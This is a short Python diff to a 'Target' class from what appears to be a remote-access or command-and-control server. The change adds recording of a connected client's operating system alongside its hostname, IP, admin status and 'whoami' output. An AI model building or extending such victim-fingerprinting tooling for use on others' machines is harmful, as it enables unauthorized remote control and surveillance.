@@ -105,6 +105,7 @@ class Target:
         self.fullname = ""
         self.status = "Placeholder"
         self.is_admin = False
+        self.os = ""
 
     def get_username(self, server):
         server.send_message(self.id, "whoami")
@@ -133,7 +134,10 @@ class Target:
             print(f"\n[-] Couldn't resolve hostname for client {self.ip}.")
             self.hostname = "[unresolved]"
         if self.hostname is not None:
-                    self.fullname = self.hostname + "@" + self.ip
+            self.fullname = self.hostname + "@" + self.ip
+
+    def get_os(self, server):
+        self.os = server.recieve_message(self.id)
 
     def get_all_infos(self, server):
         self.id, ip_and_port = server.current_socket.accept()
@@ -142,4 +146,5 @@ class Target:
         self.get_time_record()
         self.get_host_and_full_names()
         self.get_admin_infos(server)
+        self.get_os(server)
         self.get_username(server)
